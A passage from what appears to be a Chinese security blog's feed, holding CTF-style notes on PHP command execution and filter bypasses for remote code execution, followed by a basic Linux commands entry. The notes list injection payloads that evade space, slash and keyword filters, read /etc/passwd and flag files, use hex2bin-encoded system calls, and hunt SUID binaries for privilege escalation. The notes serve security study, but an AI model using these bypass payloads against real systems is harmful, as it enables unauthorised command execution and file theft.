<code>tee</code> 命令：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">passthru(<span class="hljs-string">&quot;ls | tee temp.txt&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>不能自己回显，需要print_r等输出内容</p><h3 id="backticks-反引号"><a href="#backticks-反引号" class="headerlink" title="backticks(反引号)"></a>backticks(反引号)</h3><p>和 <code>shell_exec()</code> 类似，返回完整的命令输出。</p><p>示例：’ls’ </p><p>不能自己回显，需要print_r等输出内容</p><h3 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$handle</span> = popen(<span class="hljs-string">&quot;ls&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);| <span class="hljs-built_in">echo</span> stream_get_contents(<span class="hljs-variable">$handle</span>);<br></code></pre></td></tr></table></figure><p>不能自己回显，需要print_r等输出内容</p><h3 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open"></a>proc_open</h3><p>语法:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">proc_open</span><span class="hljs-params">(<span class="hljs-variable">$command</span>,<span class="hljs-variable">$descriptorspec</span>,<span class="hljs-variable">$pipes</span>,<span class="hljs-variable">$cwd</span>,<span class="hljs-variable">$env</span> vars,<span class="hljs-variable">$options</span>)</span></span>,<br></code></pre></td></tr></table></figure><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$command</span>是要执行的命令。</span><br><span class="hljs-meta"><span class="hljs-keyword">$descriptorspec</span>是一个描述符规范数组，用于指定进程的输入、输出和错误的文件描述符。</span><br><span class="hljs-meta"><span class="hljs-keyword">$pipes</span>是一个引用变量，用于存储与进程相关的管道。</span><br><span class="hljs-meta"><span class="hljs-keyword">$cwd</span>（可选）是设置子进程的当前工作目录。</span><br><span class="hljs-meta"><span class="hljs-keyword">$env</span>（可选）是设置子进程的环境变量。</span><br><span class="hljs-meta"><span class="hljs-keyword">$other</span>_options（可选）是其他选项，如设置超时等。</span><br></code></pre></td></tr></table></figure><p><code>proc_open(&quot;ls&quot;)</code> <strong>不能直接输出命令执行结果</strong>，需要手动读取 <code>pipes[1]</code> 并 <code>echo</code> 逐行输出，使其<strong>达到 <code>system(&quot;ls&quot;)</code> 或 <code>passthru(&quot;ls&quot;)</code> 的效果</strong>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$descriptorspec</span> = [<br>    <span class="hljs-number">1</span> =&gt; [<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>],  <span class="hljs-comment">// 标准输出（可读）</span><br>    <span class="hljs-number">2</span> =&gt; [<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>]   <span class="hljs-comment">// 标准错误（可读）</span><br>];<br><br><span class="hljs-variable">$process</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-string">&quot;ls&quot;</span>, <span class="hljs-variable">$descriptorspec</span>, <span class="hljs-variable">$pipes</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_resource</span>(<span class="hljs-variable">$process</span>)) &#123;<br>    <span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>])) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>]); <span class="hljs-comment">// 逐行读取并输出</span><br>        <span class="hljs-title function_ invoke__">flush</span>();<br>    &#125;<br><br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>]);<br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>]);<br>    <span class="hljs-title function_ invoke__">proc_close</span>(<span class="hljs-variable">$process</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="取反"><a href="#取反" class="headerlink" title="~取反"></a>~取反</h3><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-24_21-34-22.png" alt="PixPin_2025-03-24_21-34-22"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-24_21-38-16.png" alt="PixPin_2025-03-24_21-38-16"></p><h2 id="被过滤"><a href="#被过滤" class="headerlink" title="&#x2F; 被过滤"></a>&#x2F; 被过滤</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span>&#123;<span class="hljs-variable">$IFS</span>&#125;-al<br></code></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">cd</span> <span class="hljs-string">..</span>%26%26 <span class="hljs-string">..</span>%26%26<span class="hljs-keyword">cd</span> <span class="hljs-string">..</span>&amp;&amp;<span class="hljs-keyword">pwd</span><br></code></pre></td></tr></table></figure><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><h3 id="大括号-里无空格"><a href="#大括号-里无空格" class="headerlink" title="大括号{ }里无空格"></a>大括号{ }里无空格</h3><p>{cat,flag.php}</p><h3 id="IFS"><a href="#IFS" class="headerlink" title="$IFS"></a>$IFS</h3><p>$IFS$9  </p><p>${IFS} </p><h3 id="09绕过"><a href="#09绕过" class="headerlink" title="%09绕过"></a>%09绕过</h3><h3 id="重定向字符"><a href="#重定向字符" class="headerlink" title="重定向字符&lt;，&lt;&gt;"></a><a href="https://so.csdn.net/so/search?q=%E9%87%8D%E5%AE%9A%E5%90%91&spm=1001.2101.3001.7020">重定向</a>字符&lt;，&lt;&gt;</h3><ol><li><p>在某些环境下，<code>&lt;</code> 和 <code>&gt;</code> 可以在特定情况下充当空格的作用。例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span>&lt;flag<br></code></pre></td></tr></table></figure></li><li></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span>&gt;<span class="hljs-variable">$&#123;PWD&#125;</span>/test<br></code></pre></td></tr></table></figure><p>等价于</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> &gt; <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><h3 id="利用-echo-命令替换"><a href="#利用-echo-命令替换" class="headerlink" title="利用 $(echo) 命令替换"></a>利用 <code>$(echo)</code> 命令替换</h3><p><code>$(command)</code> 语法在 Bash 中会执行 <code>command</code> 并用其输出替换该语法。因此，可以用 <code>echo</code> 生成一个空格：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span>$(<span class="hljs-built_in">echo</span>)/etc/passwd<br></code></pre></td></tr></table></figure><h3 id="；"><a href="#；" class="headerlink" title="；"></a>；</h3><p>ls;cat flag</p><h2 id="文件名过滤绕过"><a href="#文件名过滤绕过" class="headerlink" title="文件名过滤绕过"></a>文件名过滤绕过</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><h3 id="通配符-绕过"><a href="#通配符-绕过" class="headerlink" title="通配符??,*绕过"></a>通配符??,*绕过</h3><blockquote><p>cat &#x2F;fl??</p></blockquote><blockquote><p>cat &#x2F;f* </p></blockquote><h3 id="单引号-‘-双引号-“”-反引号-绕过正则"><a href="#单引号-‘-双引号-“”-反引号-绕过正则" class="headerlink" title="单引号(‘)双引号(“”)反引号(&#96;&#96;)绕过正则"></a>单引号(‘)双引号(“”)反引号(&#96;&#96;)绕过正则</h3><blockquote><p>cat &#x2F;fl””ag</p></blockquote><blockquote><p>c””at &#x2F;e’t’c&#x2F;pas<code>s</code>wd </p></blockquote><p>外面包裹的是单引号里面就是双引号，外面包裹的是双引号里面就是单引号，或者用斜线\去掉功能性，避免报错</p><blockquote><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">passthru</span>(<span class="hljs-string">&#x27;cat /fl&quot;&quot;ag.p\&#x27;</span>\<span class="hljs-string">&#x27;hp&#x27;</span>)</span><br></code></pre></td></tr></table></figure></blockquote><h3 id="反斜杠-绕过"><a href="#反斜杠-绕过" class="headerlink" title="反斜杠\绕过"></a>反斜杠\绕过</h3><h3 id="位置参数特殊变量：-1到-9、-和"><a href="#位置参数特殊变量：-1到-9、-和" class="headerlink" title="位置参数特殊变量：$1到$9、$@和$*"></a>位置参数特殊变量：$1到$9、$@和$*</h3><p>或者在单词结尾处插入$x，这里的x可以是任意字母，例如可以写成如下形式：</p><blockquote><p>c$@at &#x2F;e$@tc&#x2F;pas$@swd</p><p>cat$x &#x2F;etc$x&#x2F;passwd$x</p><p>ca$@t &#x2F;etc$x&#x2F;passwd$x</p></blockquote><h3 id="内联执行绕过"><a href="#内联执行绕过" class="headerlink" title="内联执行绕过"></a>内联执行绕过</h3><p>a&#x3D;c;b&#x3D;a;c&#x3D;t;$a$b$c &#x2F;1.txt</p><p>a&#x3D;f;c&#x3D;a;d&#x3D;g;b&#x3D;l;cat $a$b$c$d.php（abcd拼接出来flag）</p><h3 id="利用linux中的环境变量"><a href="#利用linux中的环境变量" class="headerlink" title="利用linux中的环境变量"></a>利用linux中的环境变量</h3><p>使用环境变量里的字符执行变量</p><p>echo $PATH              #PATH默认系统环境变量</p><p>如果出现：</p><p>&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;local&#x2F;games:&#x2F;snap&#x2F;bin</p><p>echo f${PATH:5:1}${PATH:8:1}${PATH:66:1}.${PATH:93:1}h${PATH:93:1}<br>表示了flag.php</p><p>比如${PATH:5:1}指的是取路径的第五位（从0开始数，第0位是&#x2F;）的字符，步长为1，即只取一个字母l，以此类推就能拼接成关键字flag.php</p><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><h2 id="读取命令绕过"><a href="#读取命令绕过" class="headerlink" title="读取命令绕过"></a>读取命令绕过</h2><h3 id="head"><a href="#head" class="headerlink" title="head"></a>head</h3><h3 id="使用-vi-vim-读取文件"><a href="#使用-vi-vim-读取文件" class="headerlink" title="使用 vi&#x2F;vim 读取文件"></a>使用 <code>vi</code>&#x2F;<code>vim</code> 读取文件</h3><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sas">vi <span class="hljs-keyword">filename</span><br><br>vim <span class="hljs-keyword">filename</span><br></code></pre></td></tr></table></figure><p>或者以只读模式打开文件<br>可以用 <strong>view</strong>（Vim 内置的只读模式）：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">view</span> <span class="hljs-keyword">filename</span><br>vim -R <span class="hljs-keyword">filename</span><br>//这样 vim 会以 只读模式 打开文件，防止误操作。<br></code></pre></td></tr></table></figure><h3 id="tac-反向显示，从最后一行开始往前显示"><a href="#tac-反向显示，从最后一行开始往前显示" class="headerlink" title="tac:反向显示，从最后一行开始往前显示"></a>tac:反向显示，从最后一行开始往前显示</h3><blockquote><p>tac &#x2F;flag</p></blockquote><h3 id="more-一页一页显示档案内容"><a href="#more-一页一页显示档案内容" class="headerlink" title="more:一页一页显示档案内容"></a>more:一页一页显示档案内容</h3><blockquote><p>more flag.php</p></blockquote><h3 id="less：与more类似"><a href="#less：与more类似" class="headerlink" title="less：与more类似"></a>less：与more类似</h3><h3 id="tail：查看末尾几行"><a href="#tail：查看末尾几行" class="headerlink" title="tail：查看末尾几行"></a>tail：查看末尾几行</h3><h3 id="nl：显示的时候，顺便输出行号"><a href="#nl：显示的时候，顺便输出行号" class="headerlink" title="nl：显示的时候，顺便输出行号"></a>nl：显示的时候，顺便输出行号</h3><blockquote><p>nl &#x2F;flag</p></blockquote><p>nl flag :当前目录下查找flag</p><h3 id="od：以二进制方式读取档案内容。正常的od-flag输出的纯纯二进制"><a href="#od：以二进制方式读取档案内容。正常的od-flag输出的纯纯二进制" class="headerlink" title="od：以二进制方式读取档案内容。正常的od &#x2F;flag输出的纯纯二进制"></a>od：以二进制方式读取档案内容。正常的od &#x2F;flag输出的纯纯二进制</h3><p>想看到文件内容需要：</p><p>passthru(“od -A d -c &#x2F;fla\g”);</p><h3 id="xxd：读取二进制文件"><a href="#xxd：读取二进制文件" class="headerlink" title="xxd：读取二进制文件"></a>xxd：读取二进制文件</h3><p>xxd &#x2F;flag</p><h3 id="sort：主要用于排序文件"><a href="#sort：主要用于排序文件" class="headerlink" title="sort：主要用于排序文件"></a>sort：主要用于排序文件</h3><p>so?t &#x2F;flag</p><h3 id="usr-bin-s-rt-flag"><a href="#usr-bin-s-rt-flag" class="headerlink" title="&#x2F;usr&#x2F;bin&#x2F;s?rt &#x2F;flag"></a>&#x2F;usr&#x2F;bin&#x2F;s?rt &#x2F;flag</h3><p>&#x2F;usr&#x2F;bin&#x2F;sort 和 sort 实际上是同一个命令。&#x2F;usr&#x2F;bin 目录是系统的标准目录之一，它包含了许多系统命令和工具的二进制文件，而 sort 命令通常就存放在 &#x2F;usr&#x2F;bin 目录中,因此&#x2F;usr&#x2F;bin&#x2F;sort &#x2F;flag 和 sort &#x2F;flag 是等价的。有时候sort不行可能&#x2F;usr&#x2F;bin&#x2F;s?rt可以</p><h3 id="uniq：报告或删除文件中重复的行，其实当成cat用就行"><a href="#uniq：报告或删除文件中重复的行，其实当成cat用就行" class="headerlink" title="uniq：报告或删除文件中重复的行，其实当成cat用就行"></a>uniq：报告或删除文件中重复的行，其实当成cat用就行</h3><h3 id="file-f-报错出具体内容"><a href="#file-f-报错出具体内容" class="headerlink" title="file -f:报错出具体内容"></a>file -f:报错出具体内容</h3><p>passthru(“file -f &#x2F;flag”);</p><h3 id="grep：在文本中查找指定字符串"><a href="#grep：在文本中查找指定字符串" class="headerlink" title="grep：在文本中查找指定字符串"></a>grep：在文本中查找指定字符串</h3><blockquote><p>passthru(“grep fla &#x2F;fla*”);</p></blockquote><h3 id="strings："><a href="#strings：" class="headerlink" title="strings："></a>strings：</h3><p>相当于cat</p><h3 id="无回显命令执行"><a href="#无回显命令执行" class="headerlink" title="无回显命令执行"></a>无回显命令执行</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">1.txt</span><br></code></pre></td></tr></table></figure><p> 提权ls &#x2F;-al</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span> &gt;1.txt<br></code></pre></td></tr></table></figure><h4 id="1-find"><a href="#1-find" class="headerlink" title="1. find /"></a><strong>1. <code>find /</code></strong></h4><ul><li><p><strong>作用</strong>：从根目录 <code>/</code> 开始递归搜索整个文件系统。</p></li><li><p>**为什么用 <code>/</code>**：表示搜索所有目录和子目录，确保不遗漏任何文件。</p><table><thead><tr><th align="left">功能</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">按文件名查找</td><td align="left"><code>find / -name &quot;flag*&quot;</code>(以flag开头的文件)</td></tr><tr><td align="left">按文件类型查找</td><td align="left"><code>find / -type f</code>（文件）或 <code>-type d</code>（目录）</td></tr><tr><td align="left">按文件大小查找</td><td align="left"><code>find / -size +10M</code>（大于10MB的文件）</td></tr><tr><td align="left">按修改时间查找</td><td align="left"><code>find / -mtime -7</code>（7天内修改过的文件）</td></tr><tr><td align="left">对找到的文件执行操作</td><td align="left"><code>find / -name &quot;*.log&quot; -exec rm &#123;&#125; \;</code>（删除所有.log文件）</td></tr></tbody></table><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">find</span> / -<span class="hljs-built_in">name</span> <span class="hljs-string">&quot;*flag*&quot;</span>  （文件名中含有<span class="hljs-built_in">flag</span>）<br></code></pre></td></tr></table></figure><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q"><span class="hljs-built_in">system</span>(&#x27;find / -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;*flag*&quot;</span> <span class="hljs-number">2</span>&gt;/<span class="hljs-built_in">dev</span>/<span class="hljs-built_in">null</span>&#x27;);<br></code></pre></td></tr></table></figure><ol><li><code>find</code> - 这是 Unix&#x2F;Linux 系统中用于搜索文件的命令</li><li><code>/</code> - 指定搜索的起始目录，这里是根目录，表示搜索整个文件系统</li><li><code>-type f</code> - 限制只搜索普通文件（不包括目录、设备文件等）<ul><li><code>f</code> 表示 regular file（普通文件）</li></ul></li><li><code>-name &quot;*flag*&quot;</code> - 指定要搜索的文件名模式<ul><li><code>*flag*</code> 表示文件名中包含 “flag” 这个词（前后可以有任意字符）</li><li>例如：flag.txt、my_flag_file、flag_backup 等都会被匹配</li></ul></li><li><code>2&gt;/dev/null</code> - 错误输出重定向<ul><li><code>2&gt;</code> 表示将标准错误输出(stderr)重定向</li><li><code>/dev/null</code> 是一个特殊设备，会丢弃所有写入它的数据</li><li>这样做的目的是隐藏所有错误消息（如权限不足无法访问某些目录等）</li></ul></li></ol></li></ul><h4 id="2-user-root"><a href="#2-user-root" class="headerlink" title="2. -user root"></a><strong>2. <code>-user root</code></strong></h4><ul><li><strong>作用</strong>：只查找属主（owner）是 <strong>root</strong> 的文件。</li><li><strong>为什么限制 root</strong>：因为 SUID 文件如果是 root 所有，运行时可以获取 root 权限，可能存在提权风险。</li></ul><h4 id="3-perm-4000"><a href="#3-perm-4000" class="headerlink" title="3. -perm -4000"></a><strong>3. <code>-perm -4000</code></strong></h4><ul><li><strong>作用</strong>：查找设置了 <strong>SUID 位（Set User ID）</strong> 的文件。</li><li><strong>SUID 是什么</strong>：<ul><li>当普通用户执行 SUID 文件时，该程序会以 <strong>文件所有者（root）的权限</strong> 运行。</li><li>例如：<code>/bin/passwd</code> 是 SUID 文件，普通用户修改密码时临时获得 root 权限。</li></ul></li><li><strong><code>-4000</code> 的含义</strong>：<ul><li><code>4</code> 代表 SUID 标志（<code>chmod u+s</code> 设置的权限）。</li><li><code>-</code> 表示 <strong>至少</strong> 要有 SUID 位（可能还有其他权限）。</li></ul></li></ul><h4 id="4-print"><a href="#4-print" class="headerlink" title="4. -print"></a><strong>4. <code>-print</code></strong></h4><ul><li><strong>作用</strong>：打印匹配的文件路径（默认行为，可省略）。</li></ul><h4 id="5-2-dev-null"><a href="#5-2-dev-null" class="headerlink" title="5. 2&gt;/dev/null"></a><strong>5. <code>2&gt;/dev/null</code></strong></h4><ul><li><strong>作用</strong>：将错误信息（如 <code>Permission denied</code>）丢弃，避免干扰结果。</li><li><strong>为什么需要</strong>：普通用户运行 <code>find /</code> 时，很多系统目录无权限访问，会报错。</li></ul><h4 id="6-1-txt"><a href="#6-1-txt" class="headerlink" title="6. &gt;1.txt"></a><strong>6. <code>&gt;1.txt</code></strong></h4><ul><li><strong>作用</strong>：将标准输出（即找到的文件列表）重定向到 <code>1.txt</code> 文件，而不是显示在终端。</li></ul><h2 id="程序执行-当作php代码执行"><a href="#程序执行-当作php代码执行" class="headerlink" title="程序执行(当作php代码执行)"></a>程序执行(当作php代码执行)</h2><p>readfile 文件读取</p><p>fread(fopen(‘&#x2F;etc&#x2F;passwd’,’r’),100);</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">aaa</span>=hex2bin(<span class="hljs-string">&#x27;73797374656D&#x27;</span>)(hex2bin(<span class="hljs-string">&#x27;636174202f2a&#x27;</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>hex2bin(‘参数’); 转换十六进制字符串为二进制字符串</p><p>&#x2F;bin&#x2F;date -f&#x2F;flag 2&gt;1.txt</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RCE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux常见文件和目录操作命令</title>
    <link href="/2025/04/06/Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4/"/>
    <url>/2025/04/06/Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux常见文件和目录操作命令"><a href="#Linux常见文件和目录操作命令" class="headerlink" title="Linux常见文件和目录操作命令"></a>Linux常见文件和目录操作命令</h1><h2 id="cat-1-txt"><a href="#cat-1-txt" class="headerlink" title="cat &gt;1.txt"></a>cat &gt;1.txt</h2><ol><li>**<code>cat</code>**：原本用于显示文件内容，但在这里用于接收输入。</li><li><strong><code>&gt;</code><strong>：重定向符号，表示将输出（这里是键盘输入的内容）写入到后面的文件（<code>example.txt</code>）。如果文件已存在，会</strong>覆盖原有内容</strong>；如果文件不存在，会<strong>新建文件</strong>。</li><li><strong>流程</strong>：<ul><li>输入命令后，光标会等待你键入内容。</li><li>输入任意文本（按回车换行）。</li><li>结束时按 <code>Ctrl+D</code>（Linux&#x2F;Mac）或 <code>Ctrl+Z</code>（Windows），内容会保存到 <code>example.txt</code>。</li></ul></li></ol><h2 id="touch创建新文件-mkdir文件夹-chmod变更权限"><a href="#touch创建新文件-mkdir文件夹-chmod变更权限" class="headerlink" title="touch创建新文件&#x2F;mkdir文件夹&#x2F;chmod变更权限"></a>touch创建新文件&#x2F;mkdir文件夹&#x2F;chmod变更权限</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">touch [file]        创建新的空文件<br></code></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">chmod               变更文件或目录的权限<br></code></pre></td></tr></table></figure><p>mkdir seora创建文件夹</p><h2 id="cd打开文件夹"><a href="#cd打开文件夹" class="headerlink" title="cd打开文件夹"></a>cd打开文件夹</h2><p>cd seora 打开文件夹</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">nano / vim / emacs  字符终端的文本编辑器<br></code></pre></td></tr></table></figure><h2 id="cp复制文件内容"><a href="#cp复制文件内容" class="headerlink" title="cp复制文件内容"></a>cp复制文件内容</h2><p>cp 用于复制文件或目录 cp1.txt &#x2F;seora</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">cp [file1] [file2]  用来将一个或多个源文件或者目录复制到指定的目的文件或目录<br></code></pre></td></tr></table></figure><p>复制到最后一个文件里</p><h2 id="mv移动文件"><a href="#mv移动文件" class="headerlink" title="mv移动文件"></a>mv移动文件</h2><p>mv移动文件</p><h2 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">rm [file]           可以删除一个目录中的一个或多个文件或目录，也可以将某个目录及其下属的所有文件及其子目录均删除掉<br></code></pre></td></tr></table></figure><h2 id="系统任务进程"><a href="#系统任务进程" class="headerlink" title="系统任务进程"></a>系统任务进程</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">ps                  用于报告当前系统的进程状态<br></code></pre></td></tr></table></figure><p>（任务管理器）</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">top                 实时查看系统的整体运行情况<br></code></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">kill                杀死一个进程<br></code></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">netstat             显示网络连接、路由表和网络接口信息<br></code></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">nc(netcat)          建立 TCP 和 UDP 连接并监听<br></code></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">su                  切换当前用户身份到其他用户身份<br></code></pre></td></tr></table></figure><h2 id="find查找文件和目录"><a href="#find查找文件和目录" class="headerlink" title="find查找文件和目录"></a>find查找文件和目录</h2><p><code>find</code> 是一个强大的<strong>文件搜索工具</strong>，主要用于：</p><ol><li><strong>查找文件和目录</strong>（基于名称、类型、大小、时间等条件）</li><li><strong>对找到的文件执行操作</strong>（如删除、复制、修改权限等）</li></ol><h3 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h3><table><thead><tr><th align="left">功能</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">按文件名查找</td><td align="left"><code>find / -name &quot;flag*&quot;</code>(以flag开头的文件)</td></tr><tr><td align="left">按文件类型查找</td><td align="left"><code>find / -type f</code>（文件）或 <code>-type d</code>（目录）</td></tr><tr><td align="left">按文件大小查找</td><td align="left"><code>find / -size +10M</code>（大于10MB的文件）</td></tr><tr><td align="left">按修改时间查找</td><td align="left"><code>find / -mtime -7</code>（7天内修改过的文件）</td></tr><tr><td align="left">对找到的文件执行操作</td><td align="left"><code>find / -name &quot;*.log&quot; -exec rm &#123;&#125; \;</code>（删除所有.log文件）</td></tr></tbody></table><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">find</span> / -<span class="hljs-built_in">name</span> <span class="hljs-string">&quot;*flag*&quot;</span>  （文件名中含有<span class="hljs-built_in">flag</span>）<br></code></pre></td></tr></table></figure><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q"><span class="hljs-built_in">system</span>(&#x27;find / -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;*flag*&quot;</span> <span class="hljs-number">2</span>&gt;/<span class="hljs-built_in">dev</span>/<span class="hljs-built_in">null</span>&#x27;);<br></code></pre></td></tr></table></figure><ol><li><code>find</code> - 这是 Unix&#x2F;Linux 系统中用于搜索文件的命令</li><li><code>/</code> - 指定搜索的起始目录，这里是根目录，表示搜索整个文件系统</li><li><code>-type f</code> - 限制只搜索普通文件（不包括目录、设备文件等）<ul><li><code>f</code> 表示 regular file（普通文件）</li></ul></li><li><code>-name &quot;*flag*&quot;</code> - 指定要搜索的文件名模式<ul><li><code>*flag*</code> 表示文件名中包含 “flag” 这个词（前后可以有任意字符）</li><li>例如：flag.txt、my_flag_file、flag_backup 等都会被匹配</li></ul></li><li><code>2&gt;/dev/null</code> - 错误输出重定向<ul><li><code>2&gt;</code> 表示将标准错误输出(stderr)重定向</li><li><code>/dev/null</code> 是一个特殊设备，会丢弃所有写入它的数据</li><li>这样做的目的是隐藏所有错误消息（如权限不足无法访问某些目录等）</li></ul></li></ol><h2 id="文件的压缩和备份"><a href="#文件的压缩和备份" class="headerlink" title="文件的压缩和备份"></a>文件的压缩和备份</h2><h3 id="gzip命令"><a href="#gzip命令" class="headerlink" title="gzip命令"></a>gzip命令</h3><p>格式：gzip [选项] 